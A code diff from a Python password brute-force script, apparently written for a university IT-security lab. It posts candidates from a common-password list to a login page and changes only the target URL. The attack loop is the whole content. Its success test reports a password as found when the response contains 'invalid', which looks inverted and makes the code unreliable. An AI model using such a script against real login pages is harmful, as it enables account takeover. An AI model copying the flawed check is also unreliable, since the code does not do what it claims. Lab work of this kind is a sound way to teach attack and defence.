@@ -7,7 +7,7 @@ passwords = open("./10k-most-common.txt")
 
 def try_password(user_name : str, password : str):
     payload = {"usermail" : user_name, "password" : password}
-    result =  requests.post("https://18c10a05d651af1115808e18a68c0d65.itsec-portal.informatik.uni-halle.de:8443/", data=payload)
+    result =  requests.post("https://74bf6a38053155f20180f6619e19a41c.itsec-portal.informatik.uni-halle.de:8443/account.php", data=payload)
 
     if  result.text.find("invalid") != -1:
             print("Das Passwort ist: ", password)
